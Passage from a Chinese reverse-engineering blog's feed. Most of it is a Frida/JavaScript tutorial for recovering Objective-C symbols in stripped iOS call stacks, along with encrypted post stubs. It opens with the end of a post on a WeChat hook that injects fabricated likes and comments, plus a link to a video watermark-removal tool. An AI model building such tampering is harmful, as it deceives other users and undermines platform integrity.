onDataUpdated:andData:andAdData:withChangedTime:]</code></p><p>看名字就知道，这个应该就是我们需要的hook点。</p><h5 id="整理思路"><a href="#整理思路" class="headerlink" title="整理思路"></a>整理思路</h5><p>整理一下目前的情况，首先拿到了赞和评论的模型，然后找到了hook点。下一步就是写代码去实现集赞的功能。</p><p>大概的代码逻辑应该如下</p><ul><li>在hook点的时候拿到原始的朋友圈数据，并过滤出自己的那条朋友圈</li><li>取出自己朋友圈的赞和评论数据备用</li><li>随机从通讯录好友里面选择数量去构造赞和评论对象，并放入原朋友圈赞和评论列表里面</li></ul><p>下面就是写代码实现就可以了。还有个情况是在你进入自己的朋友圈详情界面的时候，也就是看到点赞的人都是头像的界面。也需要做类似的操作才能实现集赞的功能。</p><p>这里分析的过程和上面类似，我选择的hook点为：<br><code>-[WCCommentDetailViewControllerFB setDataItem:]</code></p><h4 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h4><p>具体的代码实现这里就不再去分析了，我把代码开源到了这里<a href="https://github.com/4ch12dy/fkwechatzan">fkwechatzan</a></p><h4 id="完成效果"><a href="#完成效果" class="headerlink" title="完成效果"></a>完成效果</h4><ul><li><p>集赞助手设置界面</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/fkwechatLike/1361564255775_.pic.jpg?raw=true" width="400" hegiht="200" align="center"></p></li></ul><ul><li><p>朋友圈详情界面</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/fkwechatLike/1341564229215_.pic.jpg?raw=true" width="400" hegiht="200" align="center"></p></li><li><p>赞和评论</p></li></ul><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/fkwechatLike/1321564227655_.pic.jpg?raw=true" width="400" hegiht="200" align="center"></p><h4 id="一点总结"><a href="#一点总结" class="headerlink" title="一点总结"></a>一点总结</h4><p>本文详细介绍了使用issh和xia0LLDB去完成一个集赞功能的逆向分析过程，这个功能本身不是很复杂，这里仅仅我在逆向过程中的一些理解和分析。每个人的逆向分析过程可能都不尽相同，我提供一个完整的分析步骤，而不是完全的去靠猜测，虽然逆向有时候猜测就能有一些意外惊喜，不过不确定性也同样会花费大量时间。</p><p>最后，妈妈再也不用担心没有人赞我的朋友圈了~</p><p>下次集赞领礼品的活动我要定了！</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;微信集赞-评论插件分析及开发&quot;&gt;&lt;a href=&quot;#微信集赞-评论插件分析及开发&quot; class=&quot;headerlink&quot; title=&quot;微信集赞/评论插件分析及开发&quot;&gt;&lt;/a&gt;微信集赞/评论插件分析及开发&lt;/h3&gt;&lt;h4 id=&quot;开始&quot;&gt;&lt;a href=&quot;#开始&quot;
      
    
    </summary>
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/RE/"/>
    
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/RE/"/>
    
  </entry>
  
  <entry>
    <title>Frida调用栈符号恢复</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/02/xia0CallStackSymbols/xia0CallStackSymbols/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/02/xia0CallStackSymbols/xia0CallStackSymbols/</id>
    <published>2019-07-02T09:00:14.000Z</published>
    <updated>2019-08-01T07:53:10.362Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Frida调用栈符号恢复"><a href="#Frida调用栈符号恢复" class="headerlink" title="Frida调用栈符号恢复"></a>Frida调用栈符号恢复</h3><h4 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h4><p>搞了一阵子的Android方向的逆向研究，发现用frida去做一些hook等测试十分方便。最近自己想在iOS平台实现短视频下载去水印的问题，所以也想用frida来试试。但是测试过程中当我想去看下hook点的调用栈的时候，发现只有一些栈地址，基本没有符号信息，估计符号表被strip了。这里通常的做法就是用这些地址减去偏移然后去ida里面找到对应的方法。这样无疑是大大增加了分析的时间，想到之前解决<a href="[http://4ch12dy.site/2018/10/03/LLDB%E8%B0%83%E8%AF%95%E5%99%A8%E6%A0%88%E7%AC%A6%E5%8F%B7%E5%8C%96/%E5%BC%BA%E5%8C%96%E4%BD%A0%E7%9A%84lldb%E8%B0%83%E8%AF%95%E5%99%A8/](http://4ch12dy.site/2018/10/03/LLDB调试器栈符号化/强化你的lldb调试器/">lldb调试器栈符号恢复</a>)方案，决定把lldb的栈符号恢复脚本移植到frida中。</p><h4 id="如何恢复已经去掉符号表的可执行文件？"><a href="#如何恢复已经去掉符号表的可执行文件？" class="headerlink" title="如何恢复已经去掉符号表的可执行文件？"></a>如何恢复已经去掉符号表的可执行文件？</h4><p>这里的符号恢复仅仅针对的是OC函数，C函数如果符号表被strip以后是没有办法恢复其符号信息的。为什么OC函数可以去做符号恢复呢？这里要涉及到macho文件的格式以及ObjectC这个语言自身设计相关。可以看到在macho文件中的_DATA数据段中有很多objc的节信息，里面保存了所有的类以及方法等元数据信息。既然如此，我们肯定能找到方法去恢复这些OC函数的符号。</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/xia0CallStackSymbols/image-20190702172303432.png?raw=true" alt="image-20190702172303432"></p><h4 id="OC函数符号恢复思路"><a href="#OC函数符号恢复思路" class="headerlink" title="OC函数符号恢复思路"></a>OC函数符号恢复思路</h4><p>首先我们只能得到一堆调用链的地址，这些地址肯定是函数里面的某个偏移地址。很容易想到这个地址往前推肯定就是这个函数的首地址及函数地址。如果我们拿到了所有函数的地址，然后每一个地址和目标地址比较，与目标地址距离最近的那个地址所对应的函数不就是我们想要的符号吗。</p><p>根据上面提到的思路，目前需要解决几个问题，怎么拿到所有OC方法的地址? 以及对应的类名和方法名?如何设计匹配算法等？</p><p>这里有两种办法：</p><ul><li>第一种是自己去解析在内存中加载的macho文件，根据macho的文件格式先找到class信息，然后找到对应的method信息，method里面就保存了IMP和方法名。之前我尝试这样去过，所有的信息都能拿到，但是由于在macho在加载到内存的时候objc动态库会做很多的初始化等工作，导致要处理一些细节问题，所以就没继续做了。</li><li>第二种是利用已有的objc提供的接口objc_去拿到所有的class以及对应method的方法名和IMP。这里主要用的的API有<code>objc_copyClassNamesForImage</code>、<code>class_copyMethodList</code> 、<code>objc_getClass</code>、<code>method_getImplementation</code>、<code>method_getName</code>、<code>objc_getClass</code>、<code>objc_getMetaClass</code></li></ul><p>现在已经能拿到所有的类方法、方法名、方法实现地址了，接下来要解决的就是怎么通过调用栈的地址去找到对应的方法，这里的思路就是遍历所有的方法地址与调用栈的地址比较并计算距离，如果方法地址小于目标地址且距离最小，那么该方法就是我们要找到的符号。最后将调用栈上面的所有地址都进行该操作即可。</p><h4 id="frida的js环境编写代码"><a href="#frida的js环境编写代码" class="headerlink" title="frida的js环境编写代码"></a>frida的js环境编写代码</h4><p>由于我之前在lldb的python脚本中写过该过程代码(<del>lldb内置的OC解释器语法要求十分严格，调试了很久的代码</del>)</p><p>按照上面的思路理论上代码很好写，也不是很复杂。如果是直接写OC代码应该很好写，但是在frida中写这些还是挺折腾的。</p><p>主要的代码如下：</p><p>根据模块路径获取其所有的类</p><pre><code class="js">function getAllClass(modulePath){    // const char * objc_copyClassNamesForImage(const char *image, unsigned int *outCount)    var objc_copyClassNamesForImage = new NativeFunction(        Module.findExportByName(null, &#39;objc_copyClassNamesForImage&#39;),        &#39;pointer&#39;,        [&#39;pointer&#39;, &#39;pointer&#39;]    );    // free    var free = new NativeFunction(Module.findExportByName(null, &#39;free&#39;), &#39;void&#39;, [&#39;pointer&#39;]);    // if given modulePath nil, default is mainBundle    if(!modulePath){        var path = ObjC.classes.NSBundle.mainBundle().executablePath().UTF8String();    }else{        var path = modulePath;    }    // create args    var pPath = Memory.allocUtf8String(path);    var p = Memory.alloc(Process.pointerSize);    Memory.writeUInt(p, 0);    var pClasses = objc_copyClassNamesForImage(pPath, p);    var count = Memory.readUInt(p);    var classes = new Array(count);    for (var i = 0; i &lt; count; i++) {        var pClassName = Memory.readPointer(pClasses.add(i * Process.pointerSize));        classes[i] = Memory.readUtf8String(pClassName);    }    free(pClasses);    // XLOG(classes)    return classes;}</code></pre><p>根据类名获取所有的方法信息，由于有实例方法和类方法，这里需要分别获取。</p><pre><code class="js">function getAllMethods(classname){    var objc_getClass = new NativeFunction(        Module.findExportByName(null, &#39;objc_getClass&#39;),        &#39;pointer&#39;,        [&#39;pointer&#39;]    );    var class_copyMethodList = new NativeFunction(        Module.findExportByName(null, &#39;class_copyMethodList&#39;),        &#39;pointer&#39;,        [&#39;pointer&#39;, &#39;pointer&#39;]    );    var objc_getMetaClass = new NativeFunction(        Module.findExportByName(null, &#39;objc_getMetaClass&#39;),        &#39;pointer&#39;,        [&#39;pointer&#39;]    );    var method_getName = new NativeFunction(        Module.findExportByName(null, &#39;method_getName&#39;),        &#39;pointer&#39;,        [&#39;pointer&#39;]    );    var free = new NativeFunction(Module.findExportByName(null, &#39;free&#39;), &#39;void&#39;, [&#39;pointer&#39;]);    // get objclass and metaclass    var name = Memory.allocUtf8String(classname);    var objClass = objc_getClass(name)    var metaClass = objc_getMetaClass(name)    // get obj class all methods    var size_ptr = Memory.alloc(Process.pointerSize);    Memory.writeUInt(size_ptr, 0);    var pObjMethods = class_copyMethodList(objClass, size_ptr);    var count = Memory.readUInt(size_ptr);    var allMethods = new Array();    var allObjMethods = new Array();    // get obj class all methods name and IMP    for (var i = 0; i &lt; count; i++) {        var curObjMethod = new Array();        var pObjMethodSEL = method_getName(pObjMethods.add(i * Process.pointerSize))        var pObjMethodName = Memory.readCString(Memory.readPointer(pObjMethodSEL))        var objMethodIMP = Memory.readPointer(pObjMethodSEL.add(2*Process.pointerSize))        // XLOG(&quot;-[&quot;+classname+ &quot; &quot; + pObjMethodName+&quot;]&quot; + &quot;:&quot; + objMethodIMP)        curObjMethod.push(pObjMethodName)        curObjMethod.push(objMethodIMP)        allObjMethods.push(curObjMethod)    }    var allMetaMethods = new Array();    // get meta class all methods name and IMP    var pMetaMethods = class_copyMethodList(metaClass, size_ptr);    var count = Memory.readUInt(size_ptr);    for (var i = 0; i &lt; count; i++) {        var curMetaMethod = new Array();        var pMetaMethodSEL = method_getName(pMetaMethods.add(i * Process.pointerSize))        var pMetaMethodName = Memory.readCString(Memory.readPointer(pMetaMethodSEL))        var metaMethodIMP = Memory.readPointer(pMetaMethodSEL.add(2*Process.pointerSize))        //XLOG(&quot;+[&quot;+classname+ &quot; &quot; + pMetaMethodName+&quot;]&quot; + &quot;:&quot; + metaMethodIMP)        curMetaMethod.push(pMetaMethodName)        curMetaMethod.push(metaMethodIMP)        allMetaMethods.push(curMetaMethod)    }    allMethods.push(allObjMethods)    allMethods.push(allMetaMethods)    free(pObjMethods);    free(pMetaMethods);    return allMethods;}</code></pre><p>通过调用栈地址根据最近匹配的算法去找到对应的符号信息</p><pre><code class="js">function findSymbolFromAddress(modulePath,addr){    var frameAddr = addr    var theDis = 0xffffffffffffffff;    var tmpDis = 0;    var theClass = &quot;None&quot;    var theMethodName = &quot;None&quot;    var theMethodType = &quot;-&quot;    var theMethodIMP = 0    var allClassInfo = {}    var allClass = getAllClass(modulePath);    for(var i = 0, len = allClass.length; i &lt; len; i++){        var mInfo = getAllMethods(allClass[i]);        var curClassName = allClass[i]        objms = mInfo[0];        for(var j = 0, olen = objms.length; j &lt; olen; j++){            mname = objms[j][0]            mIMP = objms[j][1]            if(frameAddr &gt;= mIMP){                tmpDis = frameAddr-mIMP                if(tmpDis &lt; theDis){                    theDis = tmpDis                    theClass = curClassName                    theMethodName = mname                    theMethodIMP = mIMP                    theMethodType = &quot;-&quot;                }            }        }        metams = mInfo[1];        for(var k = 0, mlen = metams.length; k &lt; mlen; k++){            mname = metams[k][0]            mIMP = metams[k][1]            if(frameAddr &gt;= mIMP){                tmpDis = frameAddr-mIMP                if(tmpDis &lt; theDis){                    theDis = tmpDis                    theClass = curClassName                    theMethodName = mname                    theMethodIMP = mIMP                    theMethodType = &quot;+&quot;                }            }        }    }    symbol = theMethodType+&quot;[&quot;+theClass+&quot; &quot;+theMethodName+&quot;]&quot;    if(symbol.indexOf(&quot;.cxx&quot;)!=-1){        symbol = &quot;maybe C function?&quot;    }    // if distance &gt; 3000, maybe a c function    if(theDis &gt; 3000){        symbol = &quot;maybe C function? symbol:&quot; + symbol    }    return symbol;}</code></pre><p>在匹配算法的最后还进行了一些判断，当解析出来的方法名包含<code>.cxx</code>方法的时候说明没找到符号，可能是一个C函数。当解析出来的方法地址距离目标地址距离大于3000的时候会提示可能会C函数。</p><p>最后完整的项目地址：<a href="https://github.com/4ch12dy/xia0FridaScript">https://github.com/4ch12dy/xia0FridaScript</a></p><h4 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h4><p>我这里写了一个简单的frida脚本去测试如何导入符号恢复的js脚本</p><pre><code class="python">#!/usr/bin/pythonimport fridaimport sys import codecsimport osPACKAGE_NAME = &quot;cn.xiaobu.pipiPlay&quot;def on_message(message, data):    try:        if message:            print(&quot;[JSBACH] {0}&quot;.format(message[&quot;payload&quot;]))    except Exception as e:        print(message)        print(e)def xia0CallStackSymbolsTest():    script_dir = os.path.dirname(os.path.realpath(__file__))    xia0CallStackSymbolsJS = os.path.join(script_dir, &#39;xia0CallStackSymbols.js&#39;)    source = &#39;&#39;    with codecs.open(xia0CallStackSymbolsJS, &#39;r&#39;, &#39;utf-8&#39;) as f:        source = source + f.read()    js = &#39;&#39;&#39;    if (ObjC.available)    {            try            {                    //Your class name here  - ZYOperationView operationCopyLink                    var className = &quot;ZYMediaDownloadHelper&quot;;                    //Your function name here                    var funcName = &quot;+ downloadMediaUrl:isVideo:progress:finishBlock:&quot;;                    var hook = eval(&#39;ObjC.classes.&#39; + className + &#39;[&quot;&#39; + funcName + &#39;&quot;]&#39;);                    Interceptor.attach(hook.implementation, {                        onEnter: function(args) {                            // args[0] is self                            // args[1] is selector (SEL &quot;sendMessageWithText:&quot;)                            // args[2] holds the first function argument, an NSString                            console.log(&quot;[*] Detected call to: &quot; + className + &quot; -&gt; &quot; + funcName);                            // just call [NSThread callStackSymbols]                            var threadClass = ObjC.classes.NSThread                            var symbols = threadClass[&quot;+ callStackSymbols&quot;]()                            console.log(symbols)                            // call  xia0CallStackSymbols [true:just symbolish mainModule address false:symbolish all module address]                            xia0CallStackSymbols(true);                            xia0CallStackSymbols(false);                        }                    });            }            catch(err)            {                    console.log(&quot;[!] Exception2: &quot; + err.message);            }    }    else    {            console.log(&quot;Objective-C Runtime is not available!&quot;);    }    &#39;&#39;&#39;    return source+jsdef do_hook():    return xia0CallStackSymbolsTest()if __name__ == &#39;__main__&#39;:    try:        device = frida.get_device_manager().enumerate_devices()[-1]        print device        pid = device.spawn([PACKAGE_NAME])        print(&quot;[JSBACH] {} is starting. (pid : {})&quot;.format(PACKAGE_NAME, pid))        session = device.attach(pid)        device.resume(pid)        script = session.create_script(do_hook())        script.on(&#39;message&#39;, on_message)        script.load()        sys.stdin.read()    except KeyboardInterrupt:        sys.exit(0)</code></pre><p>只需要将<code>xia0CallStackSymbols.js</code>脚本放到项目中，然后用以下代码即可导入使用</p><pre><code class="python">script_dir = os.path.dirname(os.path.realpath(__file__))xia0CallStackSymbolsJS = os.path.join(script_dir, &#39;xia0CallStackSymbols.js&#39;)source = &#39;&#39;with codecs.open(xia0CallStackSymbolsJS, &#39;r&#39;, &#39;utf-8&#39;) as f:    source = source + f.read()your_frida_js_hook_script = &quot;&quot;load_js = your_frida_js_hook_script+source</code></pre><p>恢复的效果如下：</p><ul><li><p>通过<code>[NSThread callStackSymbols]</code>获取的调用栈符号</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/xia0CallStackSymbols/image-20190702181519237.png?raw=true" alt="image-20190702181519237"></p></li><li><p>通过调用<code>xia0CallStackSymbols</code>函数获取的调用栈符号</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/xia0CallStackSymbols/image-20190702181145710.png?raw=true" alt="image-20190702181145710"></p></li><li><p>作为比较，我在放上lldb中恢复调用栈</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/xia0CallStackSymbols/image-20190702181638614.png?raw=true" alt="image-20190702181638614"></p></li></ul><p>这里可以看出lldb调试器恢复的符号信息最完整且准确，lldb的栈符号恢复项目在<a href="https://github.com/4ch12dy/xia0LLDB">这里</a>，现在还能支持block函数的符号恢复。</p><p>这里有几个问题需要说明一下：</p><ul><li><p>xia0CallStackSymbols的符号为什么前15个地址没有显示？</p><p>因为前15个地址都是frida中js解释器里面的函数执行地址，没有办法拿到模块信息，也没必要解析这些地址。</p></li><li><p>xia0CallStackSymbols中还提供了内存对应的文件地址，如果你觉得符号有问题，可以直接去ida中手动查找符号</p></li><li><p>如果用dladdr能够拿到地址的符号信息，就没有调用xia0CallStackSymbols去恢复(比如符号表没有strip的情况)</p></li><li><p>xia0CallStackSymbols()接口可以传递一个bool参数，true为仅仅解析主模块的地址，false为所有模块都需要解析。实际在逆向过程中一般只需要主模块的符号信息，其他系统函数没很大必要。</p></li></ul><h4 id="遗留问题-Todo"><a href="#遗留问题-Todo" class="headerlink" title="遗留问题/Todo"></a>遗留问题/Todo</h4><ul><li>在执行恢复符号的过程中时间相对较长，主要原因在于每一个地址都要和所有方法比较，这里建议xia0CallStackSymbols传入true，这样只解析主模块的地址。耗时的原因还在于每一个地址解析的时候都会去调用接口获取所有方法信息，实际上每个模块只需要一次就能拿到所有方法信息，接下来要做的就是优化相关代码，缓存模块的所有方法信息，下次解析的地址为该模块时直接去缓存里面匹配查找。</li><li>在匹配符号的过程中，判断是否为C函数需要更多的原则，3000的阈值需要后面再调下。</li><li>关于block的符号恢复，目前只有在lldb中实现了，下一步准备在xia0CallStackSymbols中也支持恢复block函数符号</li></ul><h4 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h4><p>短视频下载去水印如果有人感兴趣的话，可以点<a href="https://github.com/4ch12dy/fkwatermark">这里</a>，目前支持的有皮皮搞笑、抖音（我不看抖音！）</p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul><li><a href="https://github.com/poxyran/misc">https://github.com/poxyran/misc</a></li><li>&lt; <a href="https://github.com/iddoeldor/frida-snippets">https://github.com/iddoeldor/frida-snippets</a> &gt;</li><li><a href="http://www.blogfshare.com/ioss-validate-address.html" target="_blank" rel="external">http://www.blogfshare.com/ioss-validate-address.html</a></li><li><a href="https://jmpews.github.io/2017/08/09/darwin/反注入及绕过/" target="_blank" rel="external">https://jmpews.github.io/2017/08/09/darwin/%E5%8F%8D%E6%B3%A8%E5%85%A5%E5%8F%8A%E7%BB%95%E8%BF%87/</a></li><li><a href="https://github.com/interference-security/frida-scripts">https://github.com/interference-security/frida-scripts</a></li><li><a href="https://github.com/dweinstein/awesome-frida">https://github.com/dweinstein/awesome-frida</a></li><li><a href="https://www.frida.re/docs/javascript-api/" target="_blank" rel="external">https://www.frida.re/docs/javascript-api/</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;Frida调用栈符号恢复&quot;&gt;&lt;a href=&quot;#Frida调用栈符号恢复&quot; class=&quot;headerlink&quot; title=&quot;Frida调用栈符号恢复&quot;&gt;&lt;/a&gt;Frida调用栈符号恢复&lt;/h3&gt;&lt;h4 id=&quot;开始&quot;&gt;&lt;a href=&quot;#开始&quot; class=&quot;
      
    
    </summary>
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/RE/"/>
    
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/RE/"/>
    
      <category term="frida" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/frida/"/>
    
  </entry>
  
  <entry>
    <title>android调试深度总结</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/06/04/andoid-debug-note/andoid-debug-note/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/06/04/andoid-debug-note/andoid-debug-note/</id>
    <published>2019-06-04T14:54:21.000Z</published>
    <updated>2019-08-01T07:52:05.503Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">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</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/RE/"/>
    
    
      <category term="Android" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Android/"/>
    
      <category term="debug" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/debug/"/>
    
  </entry>
  
  <entry>
    <title>Android AutoJS 脚本加密分析</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/25/autojs%E5%8A%A0%E5%AF%86%E5%88%86%E6%9E%90/autojs%E5%8A%A0%E5%AF%86%E5%88%86%E6%9E%90/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/25/autojs加密分析/autojs加密分析/</id>
    <published>2019-04-25T07:12:09.000Z</published>
    <updated>2019-07-30T07:55:01.711Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="show me the code" />    <label for="pass">show me the code</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/RE/"/>
    
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/RE/"/>
    
      <category term="AutoJS" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/AutoJS/"/>
    
  </entry>
  
  <entry>
    <title>符号执行解决代码混淆实践</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/15/antiOLLVM/antiOLLVM/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/15/antiOLLVM/antiOLLVM/</id>
    <published>2019-04-15T06:42:12.000Z</published>
    <updated>2019-05-17T08:47:41.244Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">U2FsdGVkX1+h/78KsRqbbNPDxEL0j2Dv3lXXb58hrb1Ig3TUvuOXbNLPUV9Y9QhXiAN7v+Qe7KDEd0zFrA85UM7qyjieNUTY2JpFPGbX3nb6XyJrHwSvZSZspyU4quU+o+Jhb7vkYG24F9POvllP1Q6vP99H/f30NyA+TdC4DM/iCc+thg7GYA0HaDGbq1Yl2Ng9XVCnjifRL1xOIv6eBnpS/b6DeXGlnQT0kLRDbh2HVibJeH8U4b1kBjJKJ1Vy///bEaVnoppHgGoYv4FQEohejR1MSFcpB0TgHOD7U8O+vte51QSOW57keYaDgjUu4KpzFvjmh+Lsv/h3fZLAShjnqHkHPcA++V6bqZsIx3ugncH2/e+cHEpYHf2ANcLN/T4rUh+xI+AfLY+AexTbpO/p2j4QDjf6b0/22X256ITr1KKT0FGuLFS0UHyj3aAaSYvs8SHyI1i8L1+6PcDGC8ysS0fMrxdaRRj7Qni1EvlIxkPAg6OGjXgoTyrN1Zpri8cemPXetEqH7Zy5vjzFI8i3hURxG+ij1whgnNV7yKd+VpkRzxhdPM10zKh1TameBBQug+DlMJT6+VyZ72YumLRiFP1Uy0VGD/P+hzqlE1S7/k6YEn27XHQqt5e08ytEONwtmmsgicVE6iu6JkIgXk7Kpoan3V9Y/bXv6c1xDei621cYPP0XbBDPCgthWNBGhyU9OhTmjzdmv+vtwgyBQeg/0bS2jKsBPVgfX6FGIdzMsG9KFOnBq18WMS+i4CFXpa1m3ij23hOyMEjSaNn2D7+riBNM2vE3dgepoCDDoSFJeAWuYaq5vJYzApp7ZZToBr6bbJlRw5YJB1